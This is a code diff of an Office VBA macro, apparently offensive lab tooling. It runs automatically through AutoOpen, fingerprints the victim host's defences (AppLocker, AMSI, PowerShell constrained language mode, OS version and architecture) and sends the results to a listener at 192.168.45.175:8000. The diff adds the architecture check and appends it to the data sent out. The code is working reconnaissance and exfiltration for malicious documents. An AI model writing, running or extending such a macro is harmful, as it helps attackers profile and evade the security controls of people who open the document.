@@ -1,4 +1,4 @@
-﻿Option Explicit
+Option Explicit
 
 Sub AutoOpen()
     CheckSystemStatus
@@ -18,7 +18,7 @@ End Sub
 
 ' Main function that calls the separate functions
 Sub CheckSystemStatus()
-    Dim strUrl As String, applockerStatus As String, osStatus As String, amsiStatus As String, clmStatus As String, result As String, hReq As Object
+    Dim strUrl As String, applockerStatus As String, osStatus As String, amsiStatus As String, clmStatus As String, archStatus As String, result As String, hReq As Object
     
     ' Call separate functions to get status
     applockerStatus = CheckAppLockerStatus()
@@ -29,10 +29,12 @@ Sub CheckSystemStatus()
     Debug.Print "amsiStatus: " & amsiStatus
     clmStatus = GetPowerShellLanguageMode()
     Debug.Print "clmStatus: " & clmStatus
+    archStatus = CheckArchitecture()
+    Debug.Print "archStatus: " & archStatus
 
     ' Combine results
-    result = "AppLocker=" & applockerStatus & "&AMSI=" & amsiStatus & "&CLM=" & clmStatus & "&OS=""" & osStatus & """"
-    ' Debug.Print result
+    result = "AppLocker=" & applockerStatus & "&AMSI=" & amsiStatus & "&CLM=" & clmStatus & "&OS=""" & osStatus & """" & "&arch=" & archStatus
+    'Debug.Print result
     ' Change URL
     strUrl = "http://192.168.45.175:8000/status.txt?" & result
 
@@ -75,7 +77,6 @@ End Function
 ' Function to get the operating system name and version
 Function GetOperatingSystem() As String
     ' Returns: OS information as string (e.g., "Windows 10 Pro 64-bit (10.0.19045)")
-    
     Dim objWMIService As Object, colItems As Object, objItem As Object, osName As String, osVersion As String, osArchitecture As String, computerSystem As Object, osType As String
         
     ' Connect to WMI
@@ -152,9 +153,7 @@ End Function
 ' Function to get PowerShell Language Mode without PowerShell call
 ' Uses Windows API and registry checks to determine the language mode
 Function GetPowerShellLanguageMode() As String
-    Dim isConstrained As Boolean
-    Dim isRestricted As Boolean
-    Dim executionPolicy As String
+    Dim isConstrained As Boolean, isRestricted As Boolean, executionPolicy As String
     
     On Error Resume Next
     
@@ -186,10 +185,7 @@ End Function
 
 ' Check if environment is constrained (AppLocker, WDAC, etc.)
 Private Function IsConstrainedEnvironment() As Boolean
-    Dim objFSO As Object
-    Dim objFolder As Object
-    Dim strPath As String
-    Dim objShell As Object
+    Dim objFSO As Object, objFolder As Object, strPath As String, objShell As Object
     
     On Error Resume Next
     
@@ -232,9 +228,7 @@ End Function
 
 ' Check if environment has general restrictions
 Private Function IsEnvironmentRestricted() As Boolean
-    Dim objShell As Object
-    Dim strSystemRoot As String
-    Dim objFSO As Object
+    Dim objShell As Object, strSystemRoot As String, objFSO As Object
     
     On Error Resume Next
     
@@ -264,9 +258,7 @@ End Function
 
 ' Check if system is locked down (Domain/Corporate environment with restrictions)
 Private Function IsSystemLockedDown() As Boolean
-    Dim objShell As Object
-    Dim isDomainJoined As Boolean
-    Dim lockdownKey As String
+    Dim objShell As Object, isDomainJoined As Boolean, lockdownKey As String
     
     On Error Resume Next
     
@@ -295,8 +287,7 @@ End Function
 
 ' Check if in a lockdown environment (Citrix, Terminal Services, etc.)
 Private Function IsInLockdownEnvironment() As Boolean
-    Dim objShell As Object
-    Dim sessionName As String
+    Dim objShell As Object, sessionName As String
     
     On Error Resume Next
     
@@ -333,9 +324,7 @@ End Function
 
 ' Get PowerShell execution policy from registry
 Private Function GetPowerShellExecutionPolicy() As String
-    Dim objShell As Object
-    Dim regPath As String
-    Dim policyValue As Variant
+    Dim objShell As Object, regPath As String, policyValue As Variant
     
     On Error Resume Next
     
@@ -374,8 +363,7 @@ End Function
 
 ' Helper function to get registry values
 Private Function GetRegistryValue(ByVal regPath As String, ByVal valueName As String) As Variant
-    Dim objShell As Object
-    Dim regValue As Variant
+    Dim objShell As Object, regValue As Variant
     
     On Error Resume Next
     
@@ -401,3 +389,38 @@ Private Function IIf(condition As Boolean, truePart As Variant, falsePart As Var
         IIf = falsePart
     End If
 End Function
+
+' Function to check system architecture
+Function CheckArchitecture() As String
+    Dim processName As String, wmiService As Object, processList As Object, processItem As Object, is64Bit As Boolean, architecture As String
+    
+    ' Use the process you are using: winword.exe, excel.exe, powerpnt.exe
+    processName = "winword.exe"
+    
+    ' Create WMI query and get process list
+    On Error Resume Next
+    Set wmiService = GetObject("winmgmts:\\.\root\CIMV2")
+    Set processList = wmiService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & processName & "'")
+    
+    ' Check if process is found and determine 64-bit status
+    If processList.Count > 0 Then
+        For Each processItem In processList
+            is64Bit = InStr(1, processItem.CommandLine, "Program Files (x86)", vbTextCompare) = 0
+            If is64Bit Then
+                architecture = "x64"
+            Else
+                architecture = "x86"
+            End If
+        Next
+    Else
+        architecture = "Unknown"
+    End If
+    
+    ' Clean up
+    Set wmiService = Nothing
+    Set processList = Nothing
+    On Error GoTo 0
+    
+    CheckArchitecture = architecture
+End Function
+
